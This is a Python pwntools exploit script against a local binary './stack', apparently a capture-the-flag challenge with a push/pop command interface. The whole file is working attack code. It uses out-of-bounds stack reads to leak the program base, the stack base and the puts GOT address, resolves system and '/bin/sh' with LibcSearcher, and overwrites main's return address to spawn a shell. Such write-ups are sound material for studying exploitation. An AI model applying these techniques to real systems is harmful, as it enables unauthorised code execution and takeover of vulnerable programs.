#!/usr/bin/env python2
from pwn import *
from LibcSearcher import *
from struct import pack, unpack
import os, base64, math, time
context(arch = "i386",os = "linux", log_level = "debug")

# Python's int is variable-length, so we must transfer them to C-format
def parseInt2Addr(num): 
    return u32(struct.pack("i", num))

def parseAddr2Int(num):
    return unpack("i", p32(num))[0]

def chgtop_stack(p, top):
    p.recvuntil("Cmd >>\n")
    p.sendline("c")
    p.recvuntil("Cmd >>\n")
    p.sendline("p")
    p.recvuntil("Cmd >>\n")
    p.sendline("i %d" % top)

def write_stack(p, shift, value):
    chgtop_stack(p, shift - 1)
    p.recvuntil("Cmd >>\n")
    p.sendline("i %d" % parseAddr2Int(value))

def read_stack(p, shift):
    chgtop_stack(p, shift)
    p.recvuntil("Cmd >>\n")
    p.sendline("p")
    p.recvuntil("Pop -> ")
    s = p.recvuntil("\n")
    return parseInt2Addr(int(s))

def execute(p):
    p.recvuntil("Cmd >>\n")
    p.sendline("x")
    p.recvuntil("Bye\n")

p = process('./stack')
elf = ELF('./stack')
#gdb.attach(p, "b *(&main+471)") # retn of main

#time.sleep(5)

# Read program base shift from stack retaddr pushed by _start at 0x5ac
program_base = read_stack(p, 121) - 0x5b1
print("Program Base: %s" % hex(program_base))
# Read user stack base by reading ECX pushed to stack at 0x74e
user_stack_base = read_stack(p, 85) - 0x178
print("User Stack Base: %s" % hex(user_stack_base))
main_sym = elf.sym['main'] + program_base
print("Main Symbol: %s" % hex(main_sym))
# In fact, puts_plt is no usage here
puts_plt = elf.plt['puts'] + program_base
print("puts PLT: %s" % hex(puts_plt))
puts_got = elf.got['puts'] + program_base
print("puts GOT: %s" % hex(puts_got))
"""
# Cannot use puts PLT to leak puts GOT there at return of main
# because PIE mode PLT use EBX to store offset but when returning EBX is null

# A unified shift was applied to original shift to use in main's stack frame
# Because of the compiler's alignment
unified_shift = 4

# Write main retaddr at shift 89 to call puts
write_stack(p, 89 + unified_shift, puts_got)
# Write retaddr of puts at shift 90 back to main
write_stack(p, 90 + unified_shift, main_sym)
# Write arg1 at shift 91 to pass GOT of puts
write_stack(p, 91 + unified_shift, puts_got)
execute(p)
puts_libc = u32(p.recv(4))
"""

# Leak puts_got by using a arbitary memory read
puts_libc = read_stack(p, (puts_got - user_stack_base) / 4)
print("puts libc: %s" % hex(puts_libc))

libc = LibcSearcher('puts', puts_libc)
libc_base = puts_libc - libc.dump('puts')
print("base libc: %s" % hex(libc_base))
system_libc = libc_base + libc.dump('system')
print("system libc: %s" % hex(system_libc))
binsh_libc = libc_base + libc.dump('str_bin_sh')
print("/bin/sh libc: %s" % hex(binsh_libc))

# A unified shift was applied to original shift to use in main's stack frame
# Because of the compiler's alignment
unified_shift = 4

# Write main retaddr at shift 89 to call system
write_stack(p, 89 + unified_shift, system_libc)
# Write retaddr of puts at shift 90 back to main
write_stack(p, 90 + unified_shift, main_sym)
# Write arg1 at shift 91 to pass "/bin/sh"
write_stack(p, 91 + unified_shift, binsh_libc)
execute(p)
p.interactive()